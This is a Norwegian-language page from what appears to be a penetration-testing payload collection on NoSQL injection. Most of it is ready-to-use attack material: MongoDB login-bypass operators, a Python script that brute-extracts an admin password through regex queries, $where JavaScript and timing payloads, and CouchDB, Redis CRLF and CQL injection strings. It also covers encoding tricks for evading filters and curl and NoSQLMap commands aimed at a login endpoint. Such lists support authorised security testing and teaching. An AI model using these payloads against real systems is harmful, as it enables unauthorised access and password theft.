# 🍃 Payloads for NoSQL-injeksjon

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

> **Begreper og presisering:** NoSQL omfatter ulike databasesystemer med forskjellig syntaks. En operator må nå en sårbar spørringskonstruksjon; JSON i seg selv gir ikke en omgåelse. MongoDBs JavaScript-uttrykk og funksjoner varierer med versjon og konfigurasjon; se [dokumentasjonen for $where](https://www.mongodb.com/docs/manual/reference/operator/query/where/). CouchDB/Mango, CQL og Redis-eksemplene kan ikke behandles som generelt utbyttbare MongoDB-payloads. Uthentingsskriptets trefftekst, felt og tegnsett er plassholdere som må passe applikasjonen. Koden er bevart.

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 MongoDB-injeksjon

### Omgåelse av autentisering
```javascript
// JSON-injeksjon
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL-kodet
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Vanlige operatorer
```javascript
$eq     // Lik
$ne     // Ikke lik
$gt     // Større enn
$gte    // Større enn eller lik
$lt     // Mindre enn
$lte    // Mindre enn eller lik
$in     // I tabell
$nin    // Ikke i tabell
$regex  // Regulært uttrykk
$exists // Feltet finnes
$or     // Logisk ELLER
$and    // Logisk OG
$where  // JavaScript-uttrykk
```

---

## 💉 Grunnleggende payloads

### Injeksjon i URL-parametere
```
# Omgåelse av autentisering
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Betingelser som alltid er sanne
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Injeksjon i JSON-kropp
```json
// Grunnleggende omgåelse
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Omgåelse med regulære uttrykk
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// ELLER-betingelse
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Større enn
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Uthenting av data

### Uthenting med regulære uttrykk
```javascript
// Hent ut passord tegn for tegn
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// Hent ut etter posisjon
password[$regex]=^.{0}a.*   // Er første tegn 'a'?
password[$regex]=^.{1}b.*   // Er andre tegn 'b'?

// Vanlige tegn
password[$regex]=^[a-z].*   // Begynner med liten bokstav
password[$regex]=^[A-Z].*   // Begynner med stor bokstav
password[$regex]=^[0-9].*   // Begynner med et siffer
```

### Skript for blind boolsk uthenting
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Avanserte payloads

### JavaScript-injeksjon med $where
```javascript
// Ventebasert (tidsbasert blind)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Uthenting av data
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Feilbasert
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Tabellinjeksjon (array injection)
```json
// $in-operator
{"username": {"$in": ["admin", "administrator", "root"]}}

// $nin-operator
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Operatorinjeksjon
```
# Gjør feltet til en operator
username=admin&password[$ne]=wrongpassword

# Nestet operator
username[$eq]=admin&password[$regex]=^p

# Flere operatorer
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 CouchDB-injeksjon

### Grunnleggende payloads
```javascript
// Omgåelse av autentisering
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regex
{"selector": {"username": {"$regex": ".*"}}}

// Større enn
{"selector": {"password": {"$gt": null}}}
```

### View-injeksjon
```javascript
// Injeksjon i Mango-spørring
{"selector": {"_id": {"$gt": null}}}

// Hent alle dokumenter
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Redis-injeksjon

### Grunnleggende kommandoer
```redis
# Kartlegging av nøkler
KEYS *
SCAN 0

# Uthenting av data
GET key_name
HGETALL hash_name

# Sett data
SET key value
HSET hash field value
```

### Kommandoinjeksjon via applikasjonen
```
# Hvis brukerdata brukes i Redis-kommandoer
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Cassandra-injeksjon

### CQL-injeksjon
```sql
-- Grunnleggende injeksjon
' OR '1'='1
' OR ''='

-- Omgåelse med ALLOW FILTERING
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Injeksjon av kommentarer
admin'--
admin'/*
```

---

## 🛡️ Omgåelsesteknikker

### URL-koding
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Omgåelse med Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Varianter av tabellsyntaks
```
# Standard
password[$ne]=

# Alternativ
password[0][$ne]=
password[][$ne]=
```

### Endring av Content-Type
```
# Bytt fra skjema til JSON
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Injeksjonspunkter

```
POST /login
- Parametere i forespørselskroppen (JSON/skjema)
- Parametere i spørrestrengen

GET /users?id=
- Spørringsparametere

Headere:
- Authorization
- Verdier i informasjonskapsler

API-endepunkter:
- GraphQL med MongoDB-bakende
- Filtre i REST API
```

---

## 🔍 Sjekkliste for deteksjon

```markdown
□ Test $ne-operatoren: {"field": {"$ne": ""}}
□ Test $gt-operatoren: {"field": {"$gt": ""}}
□ Test $regex: {"field": {"$regex": ".*"}}
□ Test $where: {"$where": "1==1"}
□ Test URL-tabellsyntaks: field[$ne]=
□ Test JSON-operatorer
□ Se etter forskjeller i responstid
□ Se etter forskjeller i responslengde
□ Test med ulike innholdstyper
```

---

## 🔗 Verktøy

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Skanner for MongoDB-injeksjon
nuclei -t nosql-injection.yaml -u http://target

# Manuell testing med curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Relaterte payloads

- [SQLi-payloads](SQLi.nb.md)
- [GraphQL-injeksjon](GraphQL-Injection.nb.md)

---

**Tilbake til payloadsamlingen:** [💉 Payloadsamling](../../README.md#-payloads-collection)
